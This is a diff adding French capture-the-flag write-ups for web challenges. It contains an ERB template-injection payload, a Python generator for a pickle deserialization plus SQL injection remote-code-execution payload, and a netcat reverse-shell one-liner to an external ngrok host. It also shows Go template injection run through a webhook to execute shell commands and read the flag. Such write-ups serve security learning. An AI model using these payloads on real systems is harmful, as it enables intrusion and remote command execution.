@@ -99,3 +99,85 @@ Payload final :
 
     ABCDE%0a
     <%25%3d+File.open('flag.txt').read+%25>
+
+## C.O.P
+
+La cible semble être un simple site marchand avec des références à Pickle.
+
+Dans le fichier **database.py** on voit que le site utilise la fonction **pickle.dumps()** qui peut être vulnérable à des attaques par désérialisation : 
+
+    with open('schema.sql', mode='r') as f:
+        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
+        get_db().cursor().executescript(f.read().format(*list(shop)))
+
+Dans le fichier **models.py** on voit également une injection SQL classique : 
+
+    @staticmethod
+    def select_by_id(product_id):
+        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
+
+Exemple de script Python pour automatiser la génération du payload : 
+
+    import sys
+    import base64
+    import pickle
+    import urllib.parse
+    import requests
+
+    class Payload:
+    
+      def __reduce__(self):
+        import os
+        cmd = ("$COMMANDE")
+        return os.system, (cmd,)
+
+    if __name__ == "__main__":
+      payload = base64.b64encode(pickle.dumps(Payload())).decode()
+      payload = f"' UNION SELECT '{payload}' -- "
+      payload = requests.utils.requote_uri(payload)
+      print(payload)
+
+Suite de payloads à utiliser : 
+
+    ping kvj6lchz2mo961drc3g2duq2ut0kofc4.oastify.com
+    mkfifo /tmp/p; nc $NGROK $PORT 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
+
+## RenderQuest
+
+Le site permet d'injecter des templates à partir d'autres sites.
+
+Le code est en Go et tout est dans le fichier **main.go** 
+
+On trouve une fonction extrêmement intéressante dedans : 
+
+    func (p RequestData) FetchServerInfo(command string) string {
+        out, err := exec.Command("sh", "-c", command).Output()
+        if err != nil {
+            return ""
+        }
+        return string(out)
+    }
+    
+Quelques utilisations de cette fonction se trouvent plus bas dans le code : 
+
+	reqData.ServerInfo.Hostname = reqData.FetchServerInfo("hostname")
+	reqData.ServerInfo.OS = reqData.FetchServerInfo("cat /etc/os-release | grep PRETTY_NAME | cut -d '\"' -f 2")
+	reqData.ServerInfo.KernelVersion = reqData.FetchServerInfo("uname -r")
+	reqData.ServerInfo.Memory = reqData.FetchServerInfo("free -h | awk '/^Mem/{print $2}'")
+    
+    
+Comme le site utilise des templates, il est sûrement possible d'injecter cette fonction dans un template.
+
+
+Le site https://webhook.site permet de créer un webhook avec réponses personnalisables.
+
+En mettant **{{.FetchServerInfo "ls"}}** comme réponse dans notre webhook on a bien le retour de la commande lorsque l'on visite la page suivante : 
+
+    http://94.237.54.37:39179/render?use_remote=true&page=https://webhook.site/eefae61c-61f7-424a-9e8c-ce53c112956b
+
+Exemples de payloads à mettre dans les réponses du webhook pour obtenir le flag : 
+
+    {{.FetchServerInfo "ls /"}}
+    {{.FetchServerInfo "cat /flag28c66c9c92.txt"}}
+
+Il est important de mettre le point avant la fonction sinon le site plante et retourne une erreur 500.
